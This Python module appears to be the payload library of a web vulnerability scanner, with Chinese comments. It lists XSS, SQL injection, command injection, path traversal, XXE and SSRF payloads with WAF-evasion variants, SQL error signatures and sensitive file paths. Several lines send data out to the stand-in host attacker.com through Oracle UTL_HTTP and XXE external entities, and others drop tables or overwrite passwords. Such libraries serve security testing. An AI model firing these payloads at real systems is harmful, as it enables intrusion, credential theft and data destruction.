"""WVS v16.0 - 增强型 Payload 库

基于市场调研（OWASP ZAP、Burp Suite、sqlmap、Nikto）的改进：
1. 更智能的 payload 分类和优先级
2. WAF 规避技术
3. 时间盲注优化（减少误报）
4. 多阶段验证
5. 上下文感知 payload 选择
"""

# ==================== XSS Payloads v16.0 ====================

# XSS Payload 分类 - 按检测优先级排序
XSS_PAYLOADS_V16 = {
    # 第一优先级：基础反射检测（快速、低误报）
    "basic_reflected": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "javascript:alert(1)",
    ],
    
    # 第二优先级：事件处理器（常见绕过）
    "event_handlers": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
    ],
    
    # 第三优先级：大小写混合绕过
    "case_bypass": [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<IMG SRC=x OnErRoR=alert(1)>",
        "<SvG OnLoAd=alert(1)>",
        "<a HREF='javascript:alert(1)'>click</a>",
    ],
    
    # 第四优先级：编码绕过
    "encoding_bypass": [
        # HTML 实体编码
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        # Unicode 编码
        "<img src=x onerror=\\u0061lert(1)>",
        # Base64 (data URI)
        "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
        # URL 编码
        "<img src=x onerror=alert%281%29>",
    ],
    
    # 第五优先级：标签闭合绕过
    "tag_bypass": [
        "</script><script>alert(1)</script>",
        "</title><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        "'></script><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
    ],
    
    # 第六优先级：无括号/无引号技术
    "no_brackets": [
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert(String.fromCharCode(49))>",
    ],
    
    # 第七优先级：DOM 型 XSS
    "dom_based": [
        "#<script>alert(1)</script>",
        "?q=<script>alert(1)</script>",
        "javascript:alert(document.domain)",
        "<img src=x onerror=alert(document.cookie)>",
    ],
    
    # 第八优先级：模板注入（SSTI -> XSS）
    "template_injection": [
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "{{7*7}}",  # 检测模板引擎
        "${7*7}",
    ],
    
    # WAF 规避 - 特殊字符和空白
    "waf_bypass": [
        "<img/src=x/onerror=alert(1)>",  # 用 / 代替空格
        "<svg/onload=alert(1)>",
        "<img	src=x	onerror=alert(1)>",  # Tab 分隔
        "<img\nsrc=x\nonerror=alert(1)>",  # 换行分隔
        "<<script>script>alert(1)//</script>",  # 双重标签
    ],
}

# ==================== SQL 注入 Payloads v16.0 ====================

SQLI_PAYLOADS_V16 = {
    # 第一优先级：错误型注入（快速检测）
    "error_based": [
        # 单引号测试
        "'",
        "\"",
        # 经典 OR 注入
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "\" OR \"1\"=\"1\" --",
        # 数字型注入
        "1 OR 1=1",
        "1 OR 1=1--",
        # 注释变体
        "' OR '1'='1'#",
        "' OR '1'='1'-- -",
        "' OR '1'='1'%00",
    ],
    
    # 第二优先级：UNION 注入
    "union_based": [
        # 列数探测
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        # 带回显
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password,3 FROM users--",
        # ORDER BY 注入
        "1 ORDER BY 1--",
        "1 ORDER BY 10--",
    ],
    
    # 第三优先级：布尔盲注
    "boolean_blind": [
        # 真条件
        "1 AND 1=1",
        "' AND '1'='1",
        "1' AND '1'='1'--",
        # 假条件（对比用）
        "1 AND 1=2",
        "' AND '1'='2",
        "1' AND '1'='2'--",
        # 更复杂的布尔条件
        "1 AND (SELECT COUNT(*) FROM users)>0--",
    ],
    
    # 第四优先级：时间盲注（优化：减少等待时间）
    "time_based": [
        # MySQL
        "' AND SLEEP(3)--",
        "' AND IF(1=1,SLEEP(3),0)--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        # PostgreSQL
        "' AND pg_sleep(3)--",
        "1; SELECT pg_sleep(3)--",
        # SQL Server
        "'; WAITFOR DELAY '0:0:3'--",
        "1; WAITFOR DELAY '0:0:3'--",
        # Oracle
        "' AND (SELECT COUNT(*) FROM ALL_USERS WHERE ROWNUM=1 AND UTL_INSTR.GET_HOST_ADDRESS(''||(SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com') IS NOT NULL)=1--",
    ],
    
    # 第五优先级：堆叠查询
    "stacked_queries": [
        "1; SELECT SLEEP(3)--",
        "1; DROP TABLE users--",
        "1; INSERT INTO users VALUES('hacker','password')--",
        "1; UPDATE users SET password='hacked'--",
    ],
    
    # 第六优先级：编码绕过
    "encoding_bypass": [
        # URL 编码
        "%27%20OR%20%271%27%3D%271",
        # Unicode 编码
        "' OR %u00271%u0027=%u00271",
        # 宽字节注入（GBK）
        "%df%27 OR %df%271%df%27=%df%271--",
        "%bf%27 OR 1=1--",
        # 十六进制
        "' OR 0x31=0x31--",
    ],
    
    # 第七优先级：WAF 规避
    "waf_bypass": [
        # 内联注释
        "/**/OR/**/1=1--",
        "'/**/OR/**/'1'='1",
        # 大小写混合
        "' oR '1'='1'--",
        "' Or '1'='1' AnD '1'='1",
        # 等价替代
        "' OR 1 LIKE 1--",
        "' OR 1 IN (1)--",
        # 空白字符替代
        "'%09OR%09'1'='1",  # Tab
        "'%0AOR%0A'1'='1",  # 换行
        "'%0DOR%0D'1'='1",  # 回车
    ],
    
    # 第八优先级：数据库特定
    "db_specific": {
        "mysql": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",  # 报错注入
            "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "postgresql": [
            "'; COPY (SELECT '') TO PROGRAM 'sleep 3'--",
            "' AND 1=CAST((SELECT version()) AS INT)--",
        ],
        "mssql": [
            "'; EXEC xp_cmdshell('ping attacker.com')--",
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
        ],
        "oracle": [
            "' AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',3) FROM dual)--",
            "' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) IS NOT NULL--",
        ],
    },
}

# ==================== SQL 错误特征 v16.0 ====================

SQLI_ERROR_SIGNATURES_V16 = {
    "mysql": [
        "SQL syntax",
        "mysql_fetch",
        "Warning: mysql_",
        "You have an error in your SQL syntax",
        "Unknown column",
        "Table.*doesn't exist",
        "MariaDB",
    ],
    "postgresql": [
        "PostgreSQL",
        "PG::",
        "psycopg2",
        "ERROR: syntax error at or near",
        "pg_atoi",
        "invalid input syntax",
    ],
    "sqlite": [
        "SQLite",
        "sqlite3",
        "SQLITE_ERROR",
        "near \"\": syntax error",
        "no such table",
    ],
    "oracle": [
        "ORA-",
        "Oracle error",
        "Oracle Driver",
        "PLS-",
        "PL/SQL:",
    ],
    "mssql": [
        "Microsoft SQL Server",
        "ODBC SQL Server Driver",
        "SqlException",
        "System.Data.SqlClient",
        "Unclosed quotation mark",
    ],
    "generic": [
        "syntax error",
        "unterminated string",
        "quoted string not properly terminated",
        "unexpected end of SQL command",
    ],
}

# ==================== 敏感路径 v16.0 ====================

SENSITIVE_PATHS_V16 = {
    # 版本控制
    "version_control": [
        ".git/config",
        ".git/HEAD",
        ".git/index",
        ".git/logs/HEAD",
        ".git/objects/",
        ".svn/entries",
        ".svn/wc.db",
        ".hg/hgrc",
        ".bzr/branch-format",
        ".DS_Store",
    ],
    
    # 环境配置
    "env_config": [
        ".env",
        ".env.local",
        ".env.production",
        ".env.development",
        ".env.bak",
        ".env~",
        ".env.save",
        "config.php",
        "config.php.bak",
        "config.php~",
        "config.json",
        "config.yaml",
        "config.yml",
        "settings.py",
        "settings.py.bak",
        "database.yml",
        "web.config",
        "appsettings.json",
        "secrets.yaml",
        "credentials.json",
    ],
    
    # 备份文件
    "backups": [
        "backup.sql",
        "dump.sql",
        "data.sql",
        "backup.zip",
        "backup.tar.gz",
        "backup.rar",
        "www.zip",
        "www.tar.gz",
        "site.zip",
        "db_backup.sql",
        "*.sql.bak",
    ],
    
    # 调试信息
    "debug": [
        "phpinfo.php",
        "info.php",
        "test.php",
        "debug.php",
        "php.php",
        "_profiler/",
        "server-status",
        "server-info",
    ],
    
    # 管理后台
    "admin_panels": [
        "admin/",
        "administrator/",
        "admin/login",
        "admin/login.php",
        "admin/index.php",
        "manage/",
        "manager/",
        "backend/",
        "console/",
        "wp-admin/",
        "wp-login.php",
    ],
    
    # 数据库管理
    "db_admin": [
        "phpmyadmin/",
        "pma/",
        "myadmin/",
        "mysql/",
        "dbadmin/",
        "adminer.php",
        "sqliteManager/",
        "pgadmin/",
    ],
    
    # API 文档
    "api_docs": [
        "api/swagger",
        "api/docs",
        "swagger-ui.html",
        "swagger.json",
        "v2/api-docs",
        "openapi.json",
        "api.html",
        "graphql",
        "graphiql",
    ],
    
    # 敏感信息
    "sensitive": [
        "robots.txt",
        "sitemap.xml",
        ".htaccess",
        ".htpasswd",
        "crossdomain.xml",
        "clientaccesspolicy.xml",
        ".well-known/security.txt",
        ".well-known/openid-configuration",
        "id_rsa",
        "id_rsa.pub",
        ".ssh/authorized_keys",
    ],
    
    # 云服务配置
    "cloud_config": [
        ".aws/credentials",
        ".azure/credentials",
        ".gcp/credentials.json",
        "credentials.json",
        "service-account.json",
        "terraform.tfstate",
        ".terraform/",
    ],
}

# ==================== 命令注入 Payloads v16.0 ====================

COMMAND_INJECTION_PAYLOADS_V16 = {
    # Unix/Linux
    "unix": [
        "; ls -la",
        "| ls -la",
        "|| ls -la",
        "&& ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; id",
        "| id",
        "; whoami",
        "| whoami",
        # 反弹 shell 检测（安全模式）
        "; sleep 5",
        "| sleep 5",
        "`sleep 5`",
    ],
    
    # Windows
    "windows": [
        "& dir",
        "| dir",
        "&& dir",
        "|| dir",
        "& type C:\\Windows\\win.ini",
        "| type C:\\Windows\\win.ini",
        "& whoami",
        "| whoami",
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
    ],
    
    # 通用检测
    "generic": [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "|| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ],
}

# ==================== 路径遍历 Payloads v16.0 ====================

PATH_TRAVERSAL_PAYLOADS_V16 = {
    # Unix
    "unix": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ],
    
    # Windows
    "windows": [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "....\\....\\....\\windows\\win.ini",
        "..%5c..%5c..%5cwindows\\win.ini",
        "..%255c..%255c..%255cwindows\\win.ini",
    ],
    
    # 通用
    "generic": [
        "../",
        "../../",
        "../../../",
        "..%2f",
        "..%5c",
        "....//",
        "....\\",
    ],
}

# ==================== XXE Payloads v16.0 ====================

XXE_PAYLOADS_V16 = [
    # 基础 XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    
    # 参数实体
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
    
    # XXE + SSRF
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]><foo>&xxe;</foo>',
    
    # Blind XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/log"><!ENTITY foo "aaaa">]><foo>&foo;</foo>',
]

# ==================== SSRF Payloads v16.0 ====================

SSRF_PAYLOADS_V16 = {
    # 内网探测
    "internal": [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://169.254.169.254",  # AWS 元数据
        "http://metadata.google.internal",  # GCP 元数据
        "http://169.254.169.254/latest/meta-data/",  # AWS
    ],
    
    # 绕过技术
    "bypass": [
        "http://127.1",
        "http://127.0.1",
        "http://0177.0.0.1",  # 八进制
        "http://2130706433",  # 十进制
        "http://0x7f.0.0.1",  # 十六进制
        "http://127.0.0.1.nip.io",  # DNS 绕过
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
    ],
    
    # 云元数据
    "cloud_metadata": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
    ],
}

# ==================== 检测配置 ====================

DETECTION_CONFIG_V16 = {
    "time_based_threshold": 3.0,  # 时间盲注阈值（秒）
    "confidence_threshold": 0.7,  # 置信度阈值
    "max_retries": 3,  # 最大重试次数
    "request_timeout": 10.0,  # 请求超时
    "concurrent_limit": 50,  # 并发限制
    
    # Payload 优先级（按顺序测试）
    "xss_priority": [
        "basic_reflected",
        "event_handlers",
        "case_bypass",
        "encoding_bypass",
        "tag_bypass",
        "waf_bypass",
    ],
    
    "sqli_priority": [
        "error_based",
        "union_based",
        "boolean_blind",
        "time_based",
        "waf_bypass",
    ],
}
